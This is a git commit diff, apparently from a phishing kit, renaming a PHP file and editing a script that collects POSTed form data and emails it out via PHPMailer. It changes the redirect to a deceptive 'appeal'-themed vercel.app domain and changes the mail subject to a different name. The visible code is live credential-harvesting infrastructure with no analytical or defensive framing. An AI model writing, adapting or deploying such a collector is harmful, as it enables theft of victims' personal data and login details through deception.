c859e64eaa7705dbf95b104efbbcae91ccc86c9c
adiwalfare <ronimawiads@gmail.com>
2025-08-07 14:07:56 +0500

    Update and rename MD.php to Kamran.php

--- Kamran.php
+++ Kamran.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://enter-again-your-info.vercel.app/");
+header("Location: https://re-secure-forward-your-appeal.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ABID';
+        $mail->Subject = 'KAMRAN';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
